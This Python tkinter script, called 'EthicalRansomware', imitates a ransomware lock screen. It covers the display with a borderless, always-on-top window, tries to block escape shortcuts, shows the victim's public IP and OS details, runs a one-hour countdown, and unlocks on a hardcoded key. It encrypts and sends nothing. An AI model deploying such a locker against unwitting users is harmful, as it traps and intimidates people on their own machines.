import tkinter as tk
import os
import socket
import platform
import requests
from PIL import Image, ImageTk

class EthicalRansomware:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_window()
        
        # Senha correta
        self.correct_password = "SAMURAI"
        
        # Tempo inicial (1 hora = 3600 segundos)
        self.time_left = 3600
        
        # Flag para controle do timer
        self.timer_running = True
        
        # Obter informações do sistema
        self.system_info = self.get_system_info()
        
        # Configurar a interface
        self.setup_ui()
        
        # Iniciar o timer
        self.update_timer()
    
    def get_system_info(self):
        """Obtém informações do sistema e IP real"""
        try:
            # Tentar obter IP público usando API
            ip_publico = self.get_public_ip()
        except:
            # Fallback para IP local se falhar
            ip_publico = self.get_local_ip()
        
        # Obter informações do sistema
        system_name = platform.system()
        system_version = platform.version()
        system_arch = platform.architecture()[0]
        
        return {
            'ip': ip_publico,
            'system': f"{system_name} {system_version} ({system_arch})"
        }
    
    def get_public_ip(self):
        """Obtém o IP público real usando APIs gratuitas"""
        # Lista de APIs para obter IP público (com fallback)
        apis = [
            "https://api.ipify.org",
            "https://api64.ipify.org",
            "https://icanhazip.com",
            "https://ident.me",
            "https://checkip.amazonaws.com"
        ]
        
        for api in apis:
            try:
                response = requests.get(api, timeout=5)
                if response.status_code == 200:
                    ip = response.text.strip()
                    print(f"IP público obtido via {api}: {ip}")
                    return ip
            except:
                continue
        
        # Se todas as APIs falharem, retorna IP local
        print("Não foi possível obter IP público, usando IP local")
        return self.get_local_ip()
    
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            # Tentar obter IP local
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            return local_ip
        except:
            return "127.0.0.1"
    
    def setup_window(self):
        """Configura a janela para sobrepor toda a tela"""
        self.root.title("ДАВАЙТЕ СЫГРАЕМ В ИГРУ?")
        
        # Obter dimensões da tela
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Configurar janela para tela cheia
        self.root.geometry(f"{screen_width}x{screen_height}+0+0")
        
        # Remover bordas e barra de título
        self.root.overrideredirect(True)
        
        # Definir a janela como sempre no topo
        self.root.attributes('-topmost', True)
        
        # Desabilitar atalhos do sistema
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Alt-Tab>", lambda e: "break")
        self.root.bind("<Control-Alt-Delete>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Control-W>", lambda e: "break")
        self.root.bind("<Control-Q>", lambda e: "break")
        self.root.bind("<Control-C>", lambda e: "break")
        
        # Configurar cor de fundo (azul do Windows - RGB: 0, 120, 215)
        self.root.configure(bg='#0078d7')
        
        # Definir foco na janela
        self.root.focus_force()
    
    def setup_ui(self):
        """Configura a interface do usuário"""
        # Frame principal
        main_frame = tk.Frame(self.root, bg='#0078d7')
        main_frame.pack(expand=True, fill='both')
        
        # Frame para conteúdo centralizado
        center_frame = tk.Frame(main_frame, bg='#0078d7')
        center_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # Título
        title_label = tk.Label(
            center_frame, 
            text="ДАВАЙТЕ СЫГРАЕМ В ИГРУ ?", 
            font=("Arial", 36, "bold"), 
            fg='white', 
            bg='#0078d7'
        )
        title_label.pack(pady=(0, 20))
        
        # Frame para informações do sistema (IP e SYSTEM)
        info_frame = tk.Frame(center_frame, bg='#0078d7')
        info_frame.pack(pady=(0, 20))
        
        # Informações de IP
        ip_frame = tk.Frame(info_frame, bg='#0078d7')
        ip_frame.pack(side='left', padx=(0, 50))
        
        ip_title = tk.Label(
            ip_frame,
            text="IP",
            font=("Arial", 16, "bold"),
            fg='#ffcc00',
            bg='#0078d7'
        )
        ip_title.pack()
        
        self.ip_label = tk.Label(
            ip_frame,
            text=self.system_info['ip'],
            font=("Arial", 14),
            fg='white',
            bg='#0078d7'
        )
        self.ip_label.pack()
        
        # Informações do Sistema
        system_frame = tk.Frame(info_frame, bg='#0078d7')
        system_frame.pack(side='left')
        
        system_title = tk.Label(
            system_frame,
            text="SYSTEM",
            font=("Arial", 16, "bold"),
            fg='#ffcc00',
            bg='#0078d7'
        )
        system_title.pack()
        
        self.system_label = tk.Label(
            system_frame,
            text=self.system_info['system'],
            font=("Arial", 14),
            fg='white',
            bg='#0078d7'
        )
        self.system_label.pack()
        
        # Adicionar imagem no centro
        self.add_image(center_frame)
        
        # Timer
        self.timer_label = tk.Label(
            center_frame, 
            text="", 
            font=("Arial", 48, "bold"), 
            fg='white', 
            bg='#0078d7'
        )
        self.timer_label.pack(pady=(0, 20))
        
        # Instruções
        instructions_label = tk.Label(
            center_frame, 
            text="Insira a chave para liberar o acesso:", 
            font=("Arial", 14), 
            fg='white', 
            bg='#0078d7'
        )
        instructions_label.pack(pady=(0, 10))
        
        # Frame para entrada e botão
        entry_frame = tk.Frame(center_frame, bg='#0078d7')
        entry_frame.pack()
        
        # Campo de entrada da senha
        self.password_var = tk.StringVar()
        password_entry = tk.Entry(
            entry_frame, 
            textvariable=self.password_var, 
            font=("Arial", 20), 
            show="*", 
            width=20,
            bg='white',
            fg='black',
            insertbackground='black',
            relief='flat',
            justify='center'
        )
        password_entry.pack(side='left', padx=(0, 10))
        password_entry.focus_set()
        
        # Botão para submeter senha
        self.submit_button = tk.Button(
            entry_frame, 
            text="OK", 
            command=self.check_password, 
            font=("Arial", 16, "bold"), 
            bg='#107c10',  # Verde do Windows
            fg='white',
            activebackground='#0c5e0c',
            activeforeground='white',
            relief='flat',
            padx=30,
            pady=10,
            cursor='hand2'
        )
        self.submit_button.pack(side='left')
        
        # *** CONFIGURAR ENTER PARA CONFIRMAR SENHA ***
        # Configurar o evento Enter no campo de entrada
        password_entry.bind('<Return>', self.on_enter_pressed)
        
        # Também configurar Enter no botão (para quando o botão tem foco)
        self.submit_button.bind('<Return>', self.on_enter_pressed)
        
        # Ajustar tamanho do center_frame para conteúdo
        center_frame.update_idletasks()
    
    def add_image(self, parent_frame):
        """Adiciona imagem ao centro do painel"""
        try:
            # Verificar se a imagem existe
            img_paths = [
                "img/imagem.jpg",
                "img/imagem.png",
                "imagem.jpg",
                "imagem.png"
            ]
            
            img_path = None
            for path in img_paths:
                if os.path.exists(path):
                    img_path = path
                    break
            
            if img_path:
                # Carregar e redimensionar imagem
                original_img = Image.open(img_path)
                
                # Redimensionar para caber melhor na tela (ajustável)
                screen_width = self.root.winfo_screenwidth()
                max_width = screen_width // 2  # Metade da largura da tela
                
                if original_img.width > max_width:
                    ratio = max_width / original_img.width
                    new_width = max_width
                    new_height = int(original_img.height * ratio)
                    resized_img = original_img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                else:
                    # Manter tamanho original se for menor que max_width
                    resized_img = original_img
                
                img = ImageTk.PhotoImage(resized_img)
                
                img_label = tk.Label(parent_frame, image=img, bg='#0078d7')
                img_label.image = img  # Manter referência
                img_label.pack(pady=(0, 30))
                return img_label
            else:
                # Criar uma imagem padrão se não encontrar
                default_label = tk.Label(
                    parent_frame, 
                    text="Imagem não encontrada", 
                    font=("Arial", 12), 
                    fg='white', 
                    bg='#0078d7'
                )
                default_label.pack(pady=(0, 30))
                return default_label
                
        except Exception as e:
            print(f"Erro ao carregar imagem: {e}")
            # Em caso de erro, mostrar mensagem
            error_label = tk.Label(
                parent_frame, 
                text="Erro ao carregar imagem", 
                font=("Arial", 12), 
                fg='white', 
                bg='#0078d7'
            )
            error_label.pack(pady=(0, 30))
            return error_label
    
    def on_enter_pressed(self, event=None):
        """Função chamada quando Enter é pressionado"""
        self.check_password()
        return "break"  # Prevenir comportamento padrão do Enter
    
    def update_timer(self):
        """Atualiza o timer a cada segundo"""
        if self.time_left > 0 and self.timer_running:
            # Converter segundos para formato HH:MM:SS
            hours = self.time_left // 3600
            minutes = (self.time_left % 3600) // 60
            seconds = self.time_left % 60
            
            timer_text = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            self.timer_label.config(text=timer_text)
            
            # Mudar cor para vermelho quando restar menos de 10 minutos
            if self.time_left <= 600:
                self.timer_label.config(fg='#ff0000')
            
            # Decrementar tempo
            self.time_left -= 1
            
            # Agendar próxima atualização
            self.root.after(1000, self.update_timer)
        elif self.time_left <= 0:
            self.timer_label.config(text="TEMPO ESGOTADO!", fg='#ff0000')
    
    def check_password(self):
        """Verifica se a senha está correta"""
        password = self.password_var.get()
        
        if password == self.correct_password:
            self.timer_running = False
            
            # Atualizar informações do sistema com status de liberado
            self.ip_label.config(text=f"✓ {self.system_info['ip']}", fg='#107c10')
            self.system_label.config(text=f"✓ {self.system_info['system']}", fg='#107c10')
            
            # Feedback visual de sucesso
            for widget in self.root.winfo_children():
                if isinstance(widget, tk.Frame):
                    for child in widget.winfo_children():
                        if isinstance(child, tk.Label) and child.cget("text") == "ДАВАЙТЕ СЫГРАЕМ В ИГРУ ?":
                            child.config(text="ACESSO LIBERADO!", fg='#107c10')
                        elif isinstance(child, tk.Entry):
                            child.config(state='disabled', bg='#e8e8e8')
                        elif isinstance(child, tk.Button):
                            child.config(text="✓ SENHA CORRETA", bg='#107c10')
            
            # Fechar após 2 segundos
            self.root.after(2000, self.root.quit)
        else:
            self.password_var.set("")
            # Feedback visual de erro
            self.timer_label.config(fg='#ff0000')
            self.root.after(500, lambda: self.timer_label.config(fg='white'))
    
    def run(self):
        """Inicia a aplicação"""
        self.root.mainloop()

if __name__ == "__main__":
    app = EthicalRansomware()
    app.run()